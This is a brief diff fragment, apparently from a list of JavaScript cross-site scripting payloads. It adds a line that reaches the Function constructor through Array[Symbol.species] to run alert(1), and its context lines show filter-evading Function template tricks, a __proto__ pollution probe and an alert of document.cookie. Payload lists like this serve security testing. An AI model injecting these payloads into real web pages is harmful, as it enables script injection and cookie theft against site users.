@@ -230,3 +230,4 @@ Function`alert(1)```````````
 Function`$${`a${`l${`e${`r${`t${`(${`1${`)`}`}`}`}`}`}`}`}$```
 JSON.parse('{"__proto__":["a",1]}')
 alert.call(this, document.cookie)
+Array[Symbol.species].constructor('alert(1)')();
